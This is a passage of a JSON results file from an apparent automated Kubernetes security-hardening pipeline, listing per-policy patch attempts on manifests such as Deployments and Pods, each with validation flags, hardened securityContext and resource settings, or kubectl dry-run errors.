    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker:stable\n        ports:\n        - containerPort: 8080\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01392",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker:stable\n        ports:\n        - containerPort: 8080\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01393",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker:stable\n        ports:\n        - containerPort: 8080\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01394",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker:stable\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01395",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: edisonsupipelinesjavascriptdocker\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: edisonsupipelinesjavascriptdocker\n  template:\n    metadata:\n      labels:\n        app: edisonsupipelinesjavascriptdocker\n    spec:\n      containers:\n      - name: edisonsupipelinesjavascriptdocker\n        image: containerregistryedison.azurecr.io/edisonsupipelinesjavascriptdocker:stable\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01396",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01397",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01398",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01399",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-exemplo\nspec:\n  containers:\n  - name: pod-exemplo\n    image: nginx:1.17-alpine\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01400",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"joinchannel\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01401",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"joinchannel\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01402",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"joinchannel\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01403",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"joinchannel\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01404",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"joinchannel\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01405",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"joinchannel\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01406",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"joinchannel\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01407",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"joinchannel\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01408",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"joinchannel\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01409",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"joinchannel\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01410",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"joinchannel\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01411",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"joinchannel\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01412",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"joinchannel\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01413",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"joinchannel\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01414",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"joinchannel\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01415",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Job \"joinchannel\" is invalid: spec.template.spec.restartPolicy: Required value: valid values: \"OnFailure\", \"Never\""
    ]
  },
  {
    "id": "01416",
    "policy_id": "no_latest_tag",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Pod \"dnstest3\" is invalid: spec.containers[0].resources.requests: Invalid value: \"1G\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01417",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Pod \"dnstest3\" is invalid: spec.containers[0].resources.requests: Invalid value: \"1G\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01418",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Pod \"dnstest3\" is invalid: spec.containers[0].resources.requests: Invalid value: \"1G\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01419",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Pod \"dnstest3\" is invalid: spec.containers[0].resources.requests: Invalid value: \"1G\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01420",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-deployment\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:stable\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        ports:\n        - containerPort: 6379\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01421",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-deployment\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:stable\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        ports:\n        - containerPort: 6379\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01422",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-deployment\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:stable\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        ports:\n        - containerPort: 6379\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01423",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-deployment\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis:stable\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n          requests:\n            cpu: 100m\n            memory: 128Mi\n        ports:\n        - containerPort: 6379\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01424",
    "policy_id": "no_latest_tag",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"ecr-refresh\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01425",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"ecr-refresh\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01426",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"ecr-refresh\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01427",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"ecr-refresh\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01428",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"ecr-refresh\" namespace: \"\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01429",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: open-saves-gke\n  labels:\n    app: open-saves-server\n  namespace: open-saves-namespace\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: open-saves-server\n  template:\n    metadata:\n      labels:\n        app: open-saves-server\n    spec:\n      containers:\n      - name: open-saves\n        image: gcr.io/triton-for-games-dev/triton-server:testing\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6000\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      serviceAccountName: open-saves-ksa\n",
    "errors": []
  },
  {
    "id": "01430",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: open-saves-gke\n  labels:\n    app: open-saves-server\n  namespace: open-saves-namespace\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: open-saves-server\n  template:\n    metadata:\n      labels:\n        app: open-saves-server\n    spec:\n      containers:\n      - name: open-saves\n        image: gcr.io/triton-for-games-dev/triton-server:testing\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6000\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      serviceAccountName: open-saves-ksa\n",
    "errors": []
  },
  {
    "id": "01431",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: open-saves-gke\n  labels:\n    app: open-saves-server\n  namespace: open-saves-namespace\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: open-saves-server\n  template:\n    metadata:\n      labels:\n        app: open-saves-server\n    spec:\n      containers:\n      - name: open-saves\n        image: gcr.io/triton-for-games-dev/triton-server:testing\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6000\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      serviceAccountName: open-saves-ksa\n",
    "errors": []
  },
  {
    "id": "01432",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: open-saves-gke\n  labels:\n    app: open-saves-server\n  namespace: open-saves-namespace\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: open-saves-server\n  template:\n    metadata:\n      labels:\n        app: open-saves-server\n    spec:\n      containers:\n      - name: open-saves\n        image: gcr.io/triton-for-games-dev/triton-server:testing\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6000\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      serviceAccountName: open-saves-ksa\n",
    "errors": []
  },
  {
    "id": "01433",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.8.3\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01434",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.8.3\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01435",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
